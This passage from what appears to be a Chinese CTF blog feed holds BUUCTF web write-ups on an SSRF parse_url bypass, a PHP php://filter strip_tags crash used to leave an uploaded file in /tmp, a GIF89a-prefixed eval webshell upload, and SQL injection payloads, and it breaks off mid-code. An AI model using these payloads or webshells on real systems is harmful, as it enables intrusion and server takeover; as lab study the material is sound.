class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);  <span class="comment">#将ip地址转换为长整型的数字</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//如果host为内部ip,则返回1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里注意在<code>check_inner_ip</code>中,检测的是<code>parse_url</code>后的<code>hostname</code></p><p>而最后<code>safe_request_url</code>中<code>curl</code>请求的则是完整的<code>url</code></p><p>那么这里就可以利用这点区别,让检测到的host和<code>curl</code>请求的目标不一样</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?url=http://a:@127.0.0.1:80@baidu.com/flag.php</span><br><span class="line"></span><br><span class="line">url_parse请求到的host为: baidu.com</span><br><span class="line">而curl请求的为 127.0.0.1</span><br><span class="line">这样就绕过了检测去访问到了目标上的文件</span><br></pre></td></tr></table></figure><blockquote><p>完整的url格式为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;协议://username:password(可选)@主机:端口/资源路径?请求参数# 片段ID</span><br></pre></td></tr></table></figure></blockquote><br><hr><br><h1 id="文件上传-PHP伪协议string-strip-tags带来的bug-ezinclude"><a href="#文件上传-PHP伪协议string-strip-tags带来的bug-ezinclude" class="headerlink" title="[文件上传,PHP伪协议string.strip_tags带来的bug]ezinclude"></a>[文件上传,PHP伪协议string.strip_tags带来的bug]ezinclude</h1><img src="/images/buuctf-web4/image-20221030204149194.png" alt="image-20221030204149194" style="zoom:80%;" /><p>查看源码发现提示:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>抓包发现<code>cookie</code>中正好有一个哈希值: 那么应该就是提示里的<code>md5($secret.$name)</code></p><img src="/images/buuctf-web4/image-20221030204429621.png" alt="image-20221030204429621" style="zoom:80%;" /><p>那么传一个值为它的参数<code>pass</code>试试</p><p>这里报404,但是响应包中出现了名为<code>flflflflag.php</code>的文件</p><img src="/images/buuctf-web4/image-20221030204611372.png" alt="image-20221030204611372" style="zoom:80%;" /><p>访问一下这个文件,发现了提示: 文件包含</p><img src="/images/buuctf-web4/image-20221030204747518.png" alt="image-20221030204747518" style="zoom:80%;" /><p>拿<code>php://</code>协议读一下源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?pass=fa25e54758d5d5c1927781a6ede89f8a&amp;file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web4/image-20221030205010100.png" alt="image-20221030205010100" style="zoom:80%;" /><p>解码: </p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@<span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@<span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Hash&quot;</span>,<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>),<span class="title function_ invoke__">time</span>()+<span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span> --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>flflflflag.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>config.php</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret=&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过扫描网站目录还能够扫到一个<code>dir.php</code><img src="/images/buuctf-web4/image-20221030212705485.png" alt="image-20221030212705485"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问它能够返回扫描<code>/tmp</code>目录的结果</p><p>这里补充知识点:<img src="/images/buuctf-web4/image-20221030210955257.png" alt="image-20221030210955257"></p><p>这里的PHP版本为7.033, 有一个bug是:</p><blockquote><p>使用<code>php://filter/string.strip_tags</code>导致<code>php</code>崩溃清空堆栈重启，如果在同时上传了一个文件，<strong>那么这个<code>tmp file</code>就会一直留在<code>tmp</code>目录</strong>，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。</p><p>可用版本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">&gt;• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">&gt;• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure></blockquote><p>那么利用这里漏洞,需要在通过文件包含使用<code>php://filter/string.strip_tags</code>的同时, 上传一个文件,这个文件将会被保存在<code>/tmp</code>目录下. 然后通过访问<code>dir.php</code>获得上传文件的文件名就可以了</p><p>可以通过脚本来实现传参+上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://faf05418-21ed-4937-a2e0-0ba79a558d01.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"></span><br><span class="line">phpfile = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>  <span class="comment">#这里是测试,换成一句话木马也可</span></span><br><span class="line">filedata = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: phpfile</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bak = requests.post(url=url, files=filedata)</span><br><span class="line"><span class="built_in">print</span>(bak.text)</span><br></pre></td></tr></table></figure><p>运行后,访问<code>dir.php</code>发现文件已经被上传了:</p><img src="/images/buuctf-web4/image-20221030212423603.png" alt="image-20221030212423603" style="zoom:67%;" /><p>直接通过<code>file</code>参数来访问这个文件<img src="/images/buuctf-web4/image-20221030214915202.png" alt="image-20221030214915202"></p><p><code>phpinfo</code>中就找到了flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_web部分刷题记录_PART3</title>
      <link href="/post/383bfb1c.html"/>
      <url>/post/383bfb1c.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传-CV-Maker"><a href="#文件上传-CV-Maker" class="headerlink" title="[文件上传]CV Maker"></a>[文件上传]CV Maker</h1><p>注册信息进来之后有一个上传图片的界面</p><p><img src="/../images/buuctf-web3/image-20221027094905559.png" alt="image-20221027094905559"></p><p>这里会对上传的文件进行<code>exif</code>的检测, 所以这里在一句话木马签名加上:<code>GIF89a</code>绕过检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>在上传后的网页源码中的本应加载图片的位置,能够找到上传的路径:</p><p><img src="/../images/buuctf-web3/image-20221027095054440.png" alt="image-20221027095054440"></p><p>蚁剑连接后在根目录找到flag</p><p><img src="/../images/buuctf-web3/image-20221027095116375.png" alt="image-20221027095116375"></p><br><hr><br><h1 id="二次注入-报错注入-CyberPunk"><a href="#二次注入-报错注入-CyberPunk" class="headerlink" title="[二次注入,报错注入]CyberPunk"></a>[二次注入,报错注入]CyberPunk</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php 提交订单</span><br><span class="line">delete.php 删除订单</span><br><span class="line">search.php 查订单</span><br><span class="line">change.php 改收货地址</span><br></pre></td></tr></table></figure><p>源码最下面还看到了提示, 通过file参数来进行文件包含?</p><img src="../images/buuctf-web3/image-20221027095628104.png" alt="image-20221027095628104" style="zoom: 80%;" /><p>利用<code>php://</code>协议把源码搞下来:</p><p><code>index.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>search.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>search</code>中存在一定的过滤, 但是因为禁用了<code>select</code>等关键词, 同时尝试使用<code>show,prepare</code>等进行堆叠注入也没有效果, 所以还需要去看看其他的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">123&#x27;&amp;&amp;length(database())=4</span><br><span class="line">123&#x27;&amp;&amp;1=1#  返回信息</span><br><span class="line">123&#x27;&amp;&amp;1=2#  信息不全</span><br><span class="line">123&#x27;&amp;&amp;(length(database())=8)# 返回信息</span><br><span class="line">12&#x27;;show databases;#</span><br><span class="line">123&#x27;&amp;&amp;extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">12&#x27;||extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br></pre></td></tr></table></figure><p><code>config.php</code>: 这里能够找到库名, 而且知道了是以<code>root</code>权限登录的</p><p>那么这里想到<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>可以使用root的权限去执行load_file读取文件这样的功能</span></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>change.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]); <span class="comment"># 这里在单双引号等前面加了反斜杠</span></span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>confirm.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span 